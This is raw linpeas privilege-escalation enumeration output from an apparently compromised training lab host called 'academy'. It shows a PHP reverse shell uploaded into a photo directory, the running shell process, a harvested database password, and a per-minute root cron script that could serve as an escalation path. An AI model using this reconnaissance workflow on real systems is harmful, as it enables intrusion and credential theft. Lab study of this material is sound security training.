/var/www/html/academy/admin/includes/menubar.php
/var/www/html/academy/admin/index.php
/var/www/html/academy/admin/level.php
/var/www/html/academy/admin/logout.php
/var/www/html/academy/admin/manage-students.php
/var/www/html/academy/admin/print.php
/var/www/html/academy/admin/semester.php
/var/www/html/academy/admin/session.php
/var/www/html/academy/admin/student-registration.php
/var/www/html/academy/admin/user-log.php
/var/www/html/academy/assets
/var/www/html/academy/assets/css
/var/www/html/academy/assets/css/bootstrap.css
/var/www/html/academy/assets/css/font-awesome.css
/var/www/html/academy/assets/css/style.css
/var/www/html/academy/assets/fonts
/var/www/html/academy/assets/fonts/FontAwesome.otf
/var/www/html/academy/assets/fonts/fontawesome-webfont.eot
/var/www/html/academy/assets/fonts/fontawesome-webfont.svg
/var/www/html/academy/assets/fonts/fontawesome-webfont.ttf
/var/www/html/academy/assets/fonts/fontawesome-webfont.woff
/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.eot
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.svg
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.ttf
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff
/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff2
/var/www/html/academy/assets/img
/var/www/html/academy/assets/js
/var/www/html/academy/assets/js/bootstrap.js
/var/www/html/academy/assets/js/jquery-1.11.1.js
/var/www/html/academy/change-password.php
/var/www/html/academy/check_availability.php
/var/www/html/academy/db
/var/www/html/academy/db/onlinecourse.sql
/var/www/html/academy/enroll-history.php
/var/www/html/academy/enroll.php
/var/www/html/academy/includes
/var/www/html/academy/includes/config.php
/var/www/html/academy/includes/footer.php
/var/www/html/academy/includes/header.php
/var/www/html/academy/includes/menubar.php
/var/www/html/academy/index.php
/var/www/html/academy/logout.php
/var/www/html/academy/my-profile.php
/var/www/html/academy/pincode-verification.php
/var/www/html/academy/print.php
/var/www/html/academy/studentphoto
/var/www/html/academy/studentphoto/php-rev.php
/tmp/linpeas.sh
/dev/mqueue/linpeas.txt

[+] Searching passwords in config PHP files
$mysql_password = "My_V3ryS3cur3_P4ss";                                                                                                                        
$mysql_password = "My_V3ryS3cur3_P4ss";

[+] Finding IPs inside logs (limit 100)
     44 /var/log/dpkg.log.1:1.8.2.1                                                                                                                            
     24 /var/log/dpkg.log.1:1.8.2.3
     14 /var/log/dpkg.log.1:1.8.4.3
      9 /var/log/wtmp:192.168.10.31
      7 /var/log/dpkg.log.1:7.43.0.2
      7 /var/log/dpkg.log.1:4.8.6.1
      7 /var/log/dpkg.log.1:1.7.3.2
      7 /var/log/dpkg.log.1:0.5.10.2
      7 /var/log/dpkg.log.1:0.19.8.1
      4 /var/log/installer/status:1.2.3.3
      1 /var/log/lastlog:192.168.10.31

[+] Finding passwords inside logs (limit 100)
/var/log/dpkg.log.1:2021-05-29 17:00:10 install base-passwd:amd64 <none> 3.5.46                                                                                
/var/log/dpkg.log.1:2021-05-29 17:00:10 status half-installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 configure base-passwd:amd64 3.5.46 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 status half-configured base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 status installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:11 status unpacked base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-configured base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 status unpacked base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:18 upgrade base-passwd:amd64 3.5.46 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:21 install passwd:amd64 <none> 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:21 status half-installed passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:21 status unpacked passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:24 configure base-passwd:amd64 3.5.46 <none>
/var/log/dpkg.log.1:2021-05-29 17:00:24 status half-configured base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:24 status installed base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:24 status unpacked base-passwd:amd64 3.5.46
/var/log/dpkg.log.1:2021-05-29 17:00:25 configure passwd:amd64 1:4.5-1.1 <none>
/var/log/dpkg.log.1:2021-05-29 17:00:25 status half-configured passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:25 status installed passwd:amd64 1:4.5-1.1
/var/log/dpkg.log.1:2021-05-29 17:00:25 status unpacked passwd:amd64 1:4.5-1.1
/var/log/installer/status:Description: Set up users and passwords

[+] Finding emails inside logs (limit 100)
      1 /var/log/installer/status:aeb@debian.org                                                                                                               
      1 /var/log/installer/status:anibal@debian.org
      2 /var/log/installer/status:berni@debian.org
     40 /var/log/installer/status:debian-boot@lists.debian.org
     16 /var/log/installer/status:debian-kernel@lists.debian.org
      1 /var/log/installer/status:debian-med-packaging@lists.alioth.debian.org
      1 /var/log/installer/status:debian@jff.email
      1 /var/log/installer/status:djpig@debian.org
      4 /var/log/installer/status:gcs@debian.org
      2 /var/log/installer/status:guillem@debian.org
      1 /var/log/installer/status:guus@debian.org
      1 /var/log/installer/status:linux-xfs@vger.kernel.org
      2 /var/log/installer/status:mmind@debian.org
      1 /var/log/installer/status:open-iscsi@packages.debian.org
      1 /var/log/installer/status:open-isns@packages.debian.org
      1 /var/log/installer/status:packages@release.debian.org
      2 /var/log/installer/status:parted-maintainers@alioth-lists.debian.net
      1 /var/log/installer/status:petere@debian.org
      2 /var/log/installer/status:pkg-gnupg-maint@lists.alioth.debian.org
      1 /var/log/installer/status:pkg-gnutls-maint@lists.alioth.debian.org
      1 /var/log/installer/status:pkg-grub-devel@alioth-lists.debian.net
      1 /var/log/installer/status:pkg-mdadm-devel@lists.alioth.debian.org
      1 /var/log/installer/status:rogershimizu@gmail.com
      2 /var/log/installer/status:team+lvm@tracker.debian.org
      1 /var/log/installer/status:tytso@mit.edu
      1 /var/log/installer/status:wpa@packages.debian.org
      1 /var/log/installer/status:xnox@debian.org

[+] Finding *password* or *credential* files in home
                                                                                                                                                               
[+] Finding 'pwd' or 'passw' string inside /home, /var/www, /etc, /root and list possible web(/var/www) and config(/etc) passwords
/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2                                                                                             
/var/www/html/academy/admin/assets/js/jquery-1.11.1.js
/var/www/html/academy/admin/change-password.php
/var/www/html/academy/admin/includes/config.php
/var/www/html/academy/admin/index.php
/var/www/html/academy/admin/manage-students.php
/var/www/html/academy/admin/student-registration.php
/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2
/var/www/html/academy/assets/js/jquery-1.11.1.js
/var/www/html/academy/change-password.php
/var/www/html/academy/db/onlinecourse.sql
/var/www/html/academy/includes/config.php
/var/www/html/academy/includes/menubar.php
/var/www/html/academy/index.php
/var/www/html/academy/pincode-verification.php
/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
/etc/apache2/sites-available/default-ssl.conf:          #        Note that no password is obtained from the user. Every entry in the user
/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'.
/etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries
/etc/debconf.conf:Accept-Type: password
/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat
/etc/debconf.conf:Name: passwords
/etc/debconf.conf:Reject-Type: password
/etc/debconf.conf:Stack: config, passwords
 linpeas v2.2.7 by carlospolop
                                                                                                                                                               
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEYEND:                                                                                                                                                       
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangenta: Your username


====================================( Basic information )=====================================
OS: Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                  
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: academy
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (You can use linpeas to discover hosts, learn more with -h)
[+] /usr/bin/nc is available for network discover & port scanning (You can use linpeas to discover hosts/port scanning, learn more with -h)                    
                                                                                                                                                               

====================================( System Information )====================================
[+] Operative system                                                                                                                                           
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                
Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                      
Distributor ID: Debian
Description:    Debian GNU/Linux 10 (buster)
Release:        10
Codename:       buster

[+] Sudo version
sudo Not Found                                                                                                                                                 
                                                                                                                                                               
[+] PATH
[i] Any writable folder in original PATH? (a new completed path will be exported)                                                                              
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                   
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[+] Date
Sat Jul 29 06:37:17 EDT 2023                                                                                                                                   

[+] System stats
Filesystem      Size  Used Avail Use% Mounted on                                                                                                               
/dev/sda1       6.9G  1.9G  4.7G  29% /
udev            479M     0  479M   0% /dev
tmpfs           494M     0  494M   0% /dev/shm
tmpfs            99M  4.3M   95M   5% /run
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           494M     0  494M   0% /sys/fs/cgroup
tmpfs            99M     0   99M   0% /run/user/0
              total        used        free      shared  buff/cache   available
Mem:        1009960      178916      474532       10816      356512      640884
Swap:        998396           0      998396

[+] Environment
[i] Any private information inside environment variables?                                                                                                      
HISTFILESIZE=0                                                                                                                                                 
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:13967
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
INVOCATION_ID=d29a7dcbdfb3443ebe10d76ee30417d9
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
HISTFILE=/dev/null

[+] Looking for Signature verification failed in dmseg
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] selinux enabled? .......... sestatus Not Found
[+] Printer? .......... lpstat Not Found                                                                                                                       
[+] Is this a container? .......... No                                                                                                                         
[+] Is ASLR enabled? .......... Yes                                                                                                                            

=========================================( Devices )==========================================
[+] Any sd* disk in /dev? (limit 20)                                                                                                                           
sda                                                                                                                                                            
sda1
sda2
sda5

[+] Unmounted file-system?
[i] Check if you can mount umounted devices                                                                                                                    
UUID=24d0cea7-c37b-4fd6-838e-d05cfb61a601 /               ext4    errors=remount-ro 0       1                                                                  
UUID=930c51cc-089d-42bd-8e30-f08b86c52dca none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0


====================================( Available Software )====================================
[+] Useful software?                                                                                                                                           
/usr/bin/nc                                                                                                                                                    
/usr/bin/netcat
/usr/bin/nc.traditional
/usr/bin/wget
/usr/bin/ping
/usr/bin/base64
/usr/bin/socat
/usr/bin/python
/usr/bin/python2
/usr/bin/python3
/usr/bin/python2.7
/usr/bin/python3.7
/usr/bin/perl
/usr/bin/php

[+] Installed compilers?
Compilers Not Found                                                                                                                                            
                                                                                                                                                               

================================( Processes, Cron & Services )================================
[+] Cleaned processes                                                                                                                                          
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                       
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                                                                       
root         1  0.0  0.9 103796  9972 ?        Ss   05:18   0:01 /sbin/init
root       324  0.0  0.7  40376  7976 ?        Ss   05:18   0:00 /lib/systemd/systemd-journald
root       349  0.0  0.4  21932  4952 ?        Ss   05:18   0:00 /lib/systemd/systemd-udevd
systemd+   434  0.0  0.6  93084  6556 ?        Ssl  05:18   0:00 /lib/systemd/systemd-timesyncd
root       465  0.0  0.2   8504  2736 ?        Ss   05:18   0:00 /usr/sbin/cron -f
root       470  0.0  0.7  19492  7244 ?        Ss   05:18   0:00 /lib/systemd/systemd-logind
message+   472  0.0  0.4   8980  4348 ?        Ss   05:18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       473  0.0  0.4 225824  4332 ?        Ssl  05:18   0:00 /usr/sbin/rsyslogd -n -iNONE
root       475  0.0  0.2   6620  2808 ?        Ss   05:18   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root       477  0.0  0.3   6924  3376 tty1     Ss   05:18   0:00 /bin/login -p --
root       486  0.0  0.6  15852  6876 ?        Ss   05:18   0:00 /usr/sbin/sshd -D
root       521  0.0  2.2 214992 23008 ?        Ss   05:18   0:00 /usr/sbin/apache2 -k start
mysql      541  0.0  8.9 1274452 90652 ?       Ssl  05:18   0:03 /usr/sbin/mysqld
www-data   544  0.0  1.2 215348 13032 ?        S    05:18   0:00 /usr/sbin/apache2 -k start
root       634  0.0  0.8  21024  8488 ?        Ss   05:18   0:00 /lib/systemd/systemd --user
root       635  0.0  0.2  22832  2264 ?        S    05:18   0:00 (sd-pam)
root       639  0.0  0.4   7652  4444 tty1     S+   05:18   0:00 -bash
root       643  0.0  0.5   9488  5592 ?        Ss   05:18   0:00 dhclient
root      1051  0.0  0.5   9488  5688 ?        Ss   06:07   0:00 dhclient
www-data  1075  0.0  1.2 215340 13024 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1128  0.0  1.6 215340 17168 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1129  0.0  1.9 215460 19852 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1137  0.0  1.9 215460 19540 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1147  0.0  1.9 215460 19652 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1151  0.0  2.3 218640 23700 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1157  0.0  1.2 215348 12772 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1163  0.0  1.2 215340 12756 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1172  0.0  1.9 215576 19836 ?        S    06:07   0:00 /usr/sbin/apache2 -k start
www-data  1583  0.0  0.0   2388   756 ?        S    06:33   0:00 sh -c uname -a; w; id; /bin/sh -i
www-data  1587  0.0  0.0   2388   752 ?        S    06:33   0:00 /bin/sh -i
www-data  1624  1.0  0.1   2520  1628 ?        S    06:37   0:00 /bin/sh ./linpeas.sh
www-data  1805  0.0  0.2   7640  2728 ?        R    06:37   0:00 ps aux

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                      
 56K -rwxr-xr-x 1 root root  56K Jul 27  2018 /bin/login                                                                                                       
   0 lrwxrwxrwx 1 root root    4 May 29  2021 /bin/sh -> dash
1.5M -rwxr-xr-x 1 root root 1.5M Mar 18  2021 /lib/systemd/systemd
144K -rwxr-xr-x 1 root root 143K Mar 18  2021 /lib/systemd/systemd-journald
228K -rwxr-xr-x 1 root root 227K Mar 18  2021 /lib/systemd/systemd-logind
 56K -rwxr-xr-x 1 root root  55K Mar 18  2021 /lib/systemd/systemd-timesyncd
664K -rwxr-xr-x 1 root root 663K Mar 18  2021 /lib/systemd/systemd-udevd
   0 lrwxrwxrwx 1 root root   20 Mar 18  2021 /sbin/init -> /lib/systemd/systemd
236K -rwxr-xr-x 1 root root 236K Jul  5  2020 /usr/bin/dbus-daemon
672K -rwxr-xr-x 1 root root 672K Aug 25  2020 /usr/sbin/apache2
 56K -rwxr-xr-x 1 root root  55K Oct 11  2019 /usr/sbin/cron
 20M -rwxr-xr-x 1 root root  20M Nov 25  2020 /usr/sbin/mysqld
688K -rwxr-xr-x 1 root root 686K Feb 26  2019 /usr/sbin/rsyslogd
792K -rwxr-xr-x 1 root root 789K Jan 31  2020 /usr/sbin/sshd
164K -rwxr-xr-x 1 root root 161K Mar  6  2019 /usr/sbin/vsftpd

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs                                                                                 
-rw-r--r-- 1 root root 1077 Jun 16  2021 /etc/crontab                                                                                                          

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rw-r--r--  1 root root  712 Dec 17  2018 php

/etc/cron.daily:
total 40
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2
-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg
-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate
-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db
-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x  1 root root  813 Feb 10  2019 man-db

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


* * * * * /home/grimmie/backup.sh

[+] Services
[i] Search for outdated versions                                                                                                                               
 [ - ]  apache-htcacheclean                                                                                                                                    
 [ + ]  apache2
 [ + ]  apparmor
 [ - ]  console-setup.sh
 [ + ]  cron
 [ + ]  dbus
 [ - ]  hwclock.sh
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ + ]  mysql
 [ + ]  networking
 [ + ]  procps
 [ - ]  rsync
 [ + ]  rsyslog
 [ + ]  ssh
 [ + ]  udev
 [ + ]  vsftpd


===================================( Network Information )====================================
[+] Hostname, hosts and DNS                                                                                                                                    
academy                                                                                                                                                        
127.0.0.1       localhost
127.0.1.1       academy.tcm.sec academy

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
domain localdomain
search localdomain
nameserver 172.16.2.2
tcm.sec

[+] Content of /etc/inetd.conf
/etc/inetd.conf Not Found                                                                                                                                      
                                                                                                                                                               
[+] Networks and neighbours
default         0.0.0.0                                                                                                                                        
loopback        127.0.0.0
link-local      169.254.0.0

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:a6:6e:61 brd ff:ff:ff:ff:ff:ff
    inet 172.16.2.129/24 brd 172.16.2.255 scope global dynamic ens33
       valid_lft 1638sec preferred_lft 1638sec
    inet6 fe80::20c:29ff:fea6:6e61/64 scope link 
       valid_lft forever preferred_lft forever
172.16.2.254 dev ens33 lladdr 00:50:56:ed:99:be STALE
172.16.2.2 dev ens33 lladdr 00:50:56:fc:a4:5b REACHABLE
172.16.2.1 dev ens33 lladdr 00:50:56:c0:00:08 REACHABLE

[+] Iptables rules
iptables rules Not Found                                                                                                                                       
                                                                                                                                                               
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports                                                                            
                                                                                                                                                               
[+] Can I sniff with tcpdump?
No                                                                                                                                                             
                                                                                                                                                               

====================================( Users Information )=====================================
[+] My user                                                                                                                                                    
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups                                                                                         
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                          

[+] Do I have PGP keys?
gpg Not Found                                                                                                                                                  
                                                                                                                                                               
[+] Clipboard or highlighted text?
xsel and xclip Not Found                                                                                                                                       
                                                                                                                                                               
[+] Testing 'sudo -l' without password & /etc/sudoers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           
                                                                                                                                                               
[+] Checking /etc/doas.conf
/etc/doas.conf Not Found                                                                                                                                       
                                                                                                                                                               
[+] Checking Pkexec policy
                                                                                                                                                               
[+] Don forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                              
                                                                                                                                                               
[+] Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                

[+] Users with console
grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash                                                                                                   
root:x:0:0:root:/root:/bin/bash

[+] Login information
 06:37:18 up  1:19,  1 user,  load average: 0.24, 0.06, 0.41                                                                                                   
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1     -                10:18   29:42   0.04s  0.01s -bash
root     tty1                          Sat May 29 13:31 - down   (00:12)
reboot   system boot  4.19.0-16-amd64  Sat May 29 13:30 - 13:43  (00:13)
root     pts/0        192.168.10.31    Sat May 29 13:16 - 13:27  (00:11)
root     tty1                          Sat May 29 13:16 - down   (00:11)
reboot   system boot  4.19.0-16-amd64  Sat May 29 13:15 - 13:27  (00:12)
root     pts/0        192.168.10.31    Sat May 29 13:08 - 13:14  (00:06)
administ tty1                          Sat May 29 13:06 - down   (00:08)
reboot   system boot  4.19.0-16-amd64  Sat May 29 13:05 - 13:14  (00:08)

wtmp begins Sat May 29 13:05:58 2021

[+] All users
_apt                                                                                                                                                           
backup
bin
daemon
ftp
games
gnats
grimmie
irc
list
lp
mail
man
messagebus
mysql
news
nobody
proxy
root
sshd
sync
sys
systemd-coredump
systemd-network
systemd-resolve
systemd-timesync
uucp
www-data

[+] Password policy
PASS_MAX_DAYS   99999                                                                                                                                          
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512


===================================( Software Information )===================================
[+] MySQL version                                                                                                                                              
mysql  Ver 15.1 Distrib 10.3.27-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                                                      

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No                                                                                                    
[+] MySQL connection using root/NOPASS ................. No                                                                                                    
[+] Looking for mysql credentials and exec                                                                                                                     
From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = mysql                                                                     
Found readable /etc/mysql/my.cnf
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

[+] PostgreSQL version and pgadmin credentials
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No                                                                                       
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                                                                       
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                                                                       
                                                                                                                                                               
[+] Apache server info
Version: Server version: Apache/2.4.38 (Debian)                                                                                                                
Server built:   2020-08-25T20:08:29

[+] Looking for PHPCookies
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for Wordpress wp-config.php files
wp-config.php Not Found                                                                                                                                        
                                                                                                                                                               
[+] Looking for Tomcat users file
tomcat-users.xml Not Found                                                                                                                                     
                                                                                                                                                               
[+] Mongo information
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for supervisord configuration file
supervisord.conf Not Found                                                                                                                                     
                                                                                                                                                               
[+] Looking for cesi configuration file
cesi.conf Not Found                                                                                                                                            
                                                                                                                                                               
[+] Looking for Rsyncd config file
/usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                      
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

[+] Looking for Hostapd config file
hostapd.conf Not Found                                                                                                                                         
                                                                                                                                                               
[+] Looking for wifi conns file
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for Anaconda-ks config files
anaconda-ks.cfg Not Found                                                                                                                                      
                                                                                                                                                               
[+] Looking for .vnc directories and their passwd files
.vnc Not Found                                                                                                                                                 
                                                                                                                                                               
[+] Looking for ldap directories and their hashes
/etc/ldap                                                                                                                                                      
The password hash is from the {SSHA} to 'structural'

[+] Looking for .ovpn files and credentials
.ovpn Not Found                                                                                                                                                
                                                                                                                                                               
[+] Looking for ssl/ssh files
PermitRootLogin yes                                                                                                                                            
ChallengeResponseAuthentication no
UsePAM yes

Looking inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

[+] Looking for unexpected auth lines in /etc/pam.d/sshd
No                                                                                                                                                             
                                                                                                                                                               
[+] Looking for Cloud credentials (AWS, Azure, GC)
                                                                                                                                                               
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                                                         
/etc/exports Not Found                                                                                                                                         
                                                                                                                                                               
[+] Looking for kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                                                          
krb5.conf Not Found                                                                                                                                            
tickets kerberos Not Found                                                                                                                                     
klist Not Found                                                                                                                                                
                                                                                                                                                               
[+] Looking for Kibana yaml
kibana.yml Not Found                                                                                                                                           
                                                                                                                                                               
[+] Looking for logstash files
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for elasticsearch files
 Not Found                                                                                                                                                     
                                                                                                                                                               
[+] Looking for Vault-ssh files
vault-ssh-helper.hcl Not Found                                                                                                                                 
                                                                                                                                                               
[+] Looking for AD cached hahses
cached hashes Not Found                                                                                                                                        
                                                                                                                                                               
[+] Looking for screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            
screen Not Found                                                                                                                                               
                                                                                                                                                               
[+] Looking for tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                                                            
tmux Not Found                                                                                                                                                 
                                                                                                                                                               
[+] Looking for Couchdb directory
                                                                                                                                                               
[+] Looking for redis.conf
                                                                                                                                                               
[+] Looking for dovecot files
dovecot credentials Not Found                                                                                                                                  
                                                                                                                                                               
[+] Looking for mosquitto.conf
                                                                                                                                                               

====================================( Interesting Files )=====================================
[+] SUID                                                                                                                                                       
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                    
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn           --->    SuSE_9.3/10
/usr/bin/mount          --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/usr/bin/newgrp         --->    HP-UX_10.20
/usr/bin/umount         --->    BSD/Linux[1996-08-13]
/usr/bin/chsh
/usr/bin/passwd         --->    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM
/usr/bin/su
/usr/bin/gpasswd

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                                                           
/usr/sbin/unix_chkpwd                                                                                                                                          
/usr/bin/bsd-write
/usr/bin/expiry
/usr/bin/wall
/usr/bin/crontab
/usr/bin/dotlockfile
/usr/bin/chage
/usr/bin/ssh-agent

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                   
/usr/bin/ping = cap_net_raw+ep                                                                                                                                 

[+] .sh files in path
/usr/bin/gettext.sh                                                                                                                                            

[+] Files (scripts) in /etc/profile.d/
total 20                                                                                                                                                       
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 74 root root 4096 Jul 29 06:34 ..
-rw-r--r--  1 root root  664 Mar  1  2019 bash_completion.sh
-rw-r--r--  1 root root 1107 Sep 14  2018 gawk.csh
-rw-r--r--  1 root root  757 Sep 14  2018 gawk.sh

[+] Hashes inside passwd file? ........... No
